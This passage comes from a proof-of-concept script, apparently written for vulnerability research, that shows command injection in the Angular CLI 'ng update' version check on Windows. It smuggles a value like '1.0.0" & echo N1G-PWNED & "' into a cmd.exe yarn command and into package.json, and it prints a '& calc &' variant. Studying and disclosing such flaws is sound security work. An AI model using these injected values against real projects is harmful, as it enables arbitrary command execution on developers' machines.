      child.stdout?.on("data", (d) => stdout += d.toString());
      child.stderr?.on("data", (d) => stderr += d.toString());
      child.on("close", (code) => {
        if (stderr.trim()) log(`[HOST stderr] ${stderr.trim().slice(0, 120)}`);
        if (stdout.trim()) log(`[HOST stdout] ${stdout.trim().slice(0, 160)}`);
        resolve2({ stdout, stderr });
      });
    });
  }
};
var logger = {
  info: (m) => log(`[logger.info] ${m}`),
  warn: (m) => log(`[logger.warn] ${m}`),
  error: (m) => log(`[logger.error] ${m}`),
  debug: (m) => log(`[logger.debug] ${m}`),
  fatal: (m) => log(`[logger.fatal] ${m}`),
  createChild: () => logger,
  log: (m) => log(`[logger.log] ${m}`)
};
async function main() {
  log("=== N1-G: W1 version-check venue (cli-version.ts:63, runs on EVERY ng update) ===");
  const pm = new PackageManager(win32Host, FIXTURE, SUPPORTED_PACKAGE_MANAGERS["yarn-classic"]);
  const rvNext = getCLIUpdateRunnerVersion(["@angular/core"], true);
  const rvLatest = getCLIUpdateRunnerVersion(["some-non-angular-pkg"], false);
  log(`
[1] getCLIUpdateRunnerVersion -> next=${JSON.stringify(rvNext)} nonAngular=${JSON.stringify(rvLatest)} (tag NAMES / numbers, NOT validated)`);
  log('\n[2] checkCLIVersion: pm.getManifest("@angular/cli@next") \u2014 the fetch BEFORE the manifest.version comparison');
  const manifest = await pm.getManifest(`@angular/cli@${rvNext}`);
  const { VERSION: VERSION2 } = await Promise.resolve().then(() => (init_version(), version_exports));
  const installed = VERSION2.full;
  const outcome = installed === manifest?.version ? null : String(rvNext);
  log(`[3] post-fetch compare: installed=${installed} manifest.version=${manifest?.version} -> cliVersionToInstall=${outcome}`);
  log(`[4] runTempBinary path: acquireTempPackage("@angular/cli@${outcome}") -> spawns the temp CLI binary (spawnSync, non-shell) \u2014 the FETCH inside it repeats this venue`);
  log("\n[5] package.json poisoning: applyUpdatePlan writes the UNVALIDATED dist-tags value into package.json dependencies");
  const pkgPath = (0, import_node_path3.join)(FIXTURE, "package.json");
  (0, import_node_fs3.writeFileSync)(pkgPath, JSON.stringify({ name: "fixture", dependencies: { "@angular/cli": "^22.0.0" } }, null, 2) + "\n");
  const plan = {
    packagesToUpdate: /* @__PURE__ */ new Map([["@angular/cli", '1.0.0" & echo N1G-PWNED & "']]),
    migrationsToRun: [],
    packageInfoMap: /* @__PURE__ */ new Map(),
    registryClient: {}
  };
  await applyUpdatePlan(FIXTURE, plan, logger);
  const written = JSON.parse((0, import_node_fs3.readFileSync)(pkgPath, "utf8"));
  log(`[5] written package.json dependencies["@angular/cli"] = ${JSON.stringify(written.dependencies["@angular/cli"])}`);
  log(`[5] POISONING-WRITE: ${written.dependencies["@angular/cli"].includes("N1G-PWNED") ? "CONFIRMED \u2014 the unvalidated value is persisted into the dev package.json" : "NOT WRITTEN"}`);
  log('\n[6] exact cmd.exe string for the version-check venue (malicious dist-tags "next"):');
  log('    yarn info --json --verbose "@angular/cli@1.0.0" & calc & ""');
  log("    -> executes yarn, then calc, then an empty command (cmd.exe shell:true semantics).");
  log('    The live run above used "echo N1G-PWNED" in place of calc to demonstrate the `&` chaining executes a second command:');
  const pwned = logged.filter((l) => l.includes("N1G-PWNED")).length;
  log(`
=== VERDICT: version-check venue DEMONSTRATED = ${pwned >= 2 ? "y" : "n"} (marker fired ${pwned} times: cmd-exec chain + package.json write) ===`);
}
main().catch((e) => {
  console.error("FAILED:", e.message);
  process.exit(1);
});
/**
 * @license
 * Copyright Google LLC All Rights Reserved.
 *
 * Use of this source code is governed by an MIT-style license that can be
 * found in the LICENSE file at https://angular.dev/license
 */
